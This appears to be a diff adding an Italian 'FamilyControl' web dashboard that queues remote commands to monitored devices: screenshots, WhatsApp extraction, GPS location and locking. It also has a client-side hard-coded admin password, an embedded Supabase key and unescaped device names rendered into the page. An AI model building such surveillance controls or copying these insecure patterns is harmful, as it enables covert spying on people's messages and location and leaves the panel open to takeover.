@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FamilyControl - Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/lucide/latest/umd/lucide.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+            background-color: #f3f4f6;
+        }
+    </style>
+</head>
+<body>
+    <div id="app"></div>
+
+    <script>
+        // Configurazione Supabase
+        const SUPABASE_URL = 'https://rclarbbasnnwmwhpoenn.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJjbGFyYmJhc25ud213aHBvZW5uIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgyMzc4OTYsImV4cCI6MjA5MzgxMzg5Nn0.yI9jvnzw_gojcR7jNVK5qBwJs9uwpBMv36vvmHwoZMQ';
+        const ADMIN_PASSWORD = 'Family2024!';
+
+        let appState = {
+            authenticated: false,
+            devices: [],
+            selectedDevice: null,
+            deviceData: null,
+            activeTab: 'overview',
+            recording: false,
+            recordingTime: 0
+        };
+
+        const { createClient } = window.supabase;
+        const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        async function login(password) {
+            if (password === ADMIN_PASSWORD) {
+                appState.authenticated = true;
+                loadDevices();
+                setInterval(loadDevices, 5000);
+                render();
+            } else {
+                alert('❌ Password errata!');
+            }
+        }
+
+        async function loadDevices() {
+            try {
+                const { data, error } = await supabase
+                    .from('devices')
+                    .select('*')
+                    .order('last_seen', { ascending: false });
+                
+                if (error) throw error;
+                appState.devices = data || [];
+                render();
+            } catch (error) {
+                console.error('Errore:', error);
+            }
+        }
+
+        async function selectDevice(device) {
+            appState.selectedDevice = device;
+            loadDeviceData();
+            render();
+        }
+
+        async function loadDeviceData() {
+            if (!appState.selectedDevice) return;
+            
+            try {
+                const { data, error } = await supabase
+                    .from('device_data')
+                    .select('*')
+                    .eq('device_id', appState.selectedDevice.id)
+                    .order('created_at', { ascending: false })
+                    .limit(1);
+                
+                if (error) throw error;
+                if (data && data.length > 0) {
+                    appState.deviceData = data[0];
+                    render();
+                }
+            } catch (error) {
+                console.error('Errore:', error);
+            }
+        }
+
+        async function sendCommand(command) {
+            try {
+                await supabase
+                    .from('commands')
+                    .insert([{
+                        device_id: appState.selectedDevice.id,
+                        command: command,
+                        params: {},
+                        status: 'pending'
+                    }]);
+                
+                alert(`✅ Comando "${command}" inviato!`);
+            } catch (error) {
+                alert('❌ Errore nell\'invio del comando');
+            }
+        }
+
+        function logout() {
+            appState.authenticated = false;
+            appState.selectedDevice = null;
+            render();
+        }
+
+        function render() {
+            const app = document.getElementById('app');
+            
+            if (!appState.authenticated) {
+                app.innerHTML = `
+                    <div class="min-h-screen bg-gradient-to-br from-blue-600 to-blue-800 flex items-center justify-center">
+                        <div class="bg-white rounded-lg shadow-2xl p-8 w-96">
+                            <h1 class="text-3xl font-bold text-center mb-6 text-gray-800">FamilyControl</h1>
+                            <p class="text-center text-gray-600 mb-6">Accedi al pannello di controllo</p>
+                            
+                            <form onsubmit="event.preventDefault(); login(document.getElementById('password').value);">
+                                <input
+                                    type="password"
+                                    id="password"
+                                    placeholder="Inserisci password"
+                                    class="w-full px-4 py-2 border border-gray-300 rounded-lg mb-4 focus:outline-none focus:border-blue-500"
+                                    autofocus
+                                />
+                                <button
+                                    type="submit"
+                                    class="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700 transition"
+                                >
+                                    Accedi
+                                </button>
+                            </form>
+                        </div>
+                    </div>
+                `;
+            } else {
+                app.innerHTML = `
+                    <div class="min-h-screen bg-gray-100">
+                        <header class="bg-white shadow">
+                            <div class="max-w-7xl mx-auto px-4 py-4 flex justify-between items-center">
+                                <h1 class="text-2xl font-bold text-gray-800">FamilyControl</h1>
+                                <button onclick="logout()" class="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700">
+                                    Logout
+                                </button>
+                            </div>
+                        </header>
+
+                        <div class="max-w-7xl mx-auto px-4 py-6">
+                            <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+                                <div class="lg:col-span-1">
+                                    <div class="bg-white rounded-lg shadow p-4">
+                                        <h2 class="text-lg font-semibold mb-4">Dispositivi</h2>
+                                        ${appState.devices.length === 0 ? 
+                                            '<p class="text-gray-500">Nessun dispositivo collegato</p>' :
+                                            appState.devices.map(device => `
+                                                <button onclick="selectDevice(${JSON.stringify(device).replace(/"/g, '&quot;')})" 
+                                                    class="w-full text-left p-3 rounded-lg mb-2 ${appState.selectedDevice?.id === device.id ? 'bg-blue-600 text-white' : 'bg-gray-100 hover:bg-gray-200'}">
+                                                    <p class="font-medium">${device.name}</p>
+                                                </button>
+                                            `).join('')
+                                        }
+                                    </div>
+                                </div>
+
+                                <div class="lg:col-span-3">
+                                    ${!appState.selectedDevice ? 
+                                        '<div class="bg-white rounded-lg shadow p-8 text-center"><p class="text-gray-500">Seleziona un dispositivo</p></div>' :
+                                        `<div class="bg-white rounded-lg shadow p-6">
+                                            <h3 class="text-lg font-semibold mb-4">Panoramica</h3>
+                                            <div class="grid grid-cols-2 gap-4 mb-6">
+                                                <div class="bg-blue-50 p-4 rounded-lg">
+                                                    <p class="text-sm text-gray-600 mb-2">⏱️ Tempo schermo</p>
+                                                    <p class="text-2xl font-bold">${appState.deviceData?.screen_time || '0'} min</p>
+                                                </div>
+                                                <div class="bg-green-50 p-4 rounded-lg">
+                                                    <p class="text-sm text-gray-600 mb-2">📱 App aperte</p>
+                                                    <p class="text-2xl font-bold">${appState.deviceData?.open_apps?.length || 0}</p>
+                                                </div>
+                                            </div>
+                                            <div class="space-y-2">
+                                                <button onclick="sendCommand('take_screenshot')" class="w-full bg-purple-600 text-white py-2 rounded hover:bg-purple-700">
+                                                    📸 Cattura Screenshot
+                                                </button>
+                                                <button onclick="sendCommand('get_whatsapp')" class="w-full bg-green-600 text-white py-2 rounded hover:bg-green-700">
+                                                    💬 Sincronizza WhatsApp
+                                                </button>
+                                                <button onclick="sendCommand('get_location')" class="w-full bg-orange-600 text-white py-2 rounded hover:bg-orange-700">
+                                                    📍 Richiedi GPS
+                                                </button>
+                                                <button onclick="sendCommand('lock_device')" class="w-full bg-red-600 text-white py-2 rounded hover:bg-red-700">
+                                                    🔒 Blocca dispositivo
+                                                </button>
+                                            </div>
+                                        </div>`
+                                    }
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+        }
+
+        render();
+    </script>
+</body>
+</html>
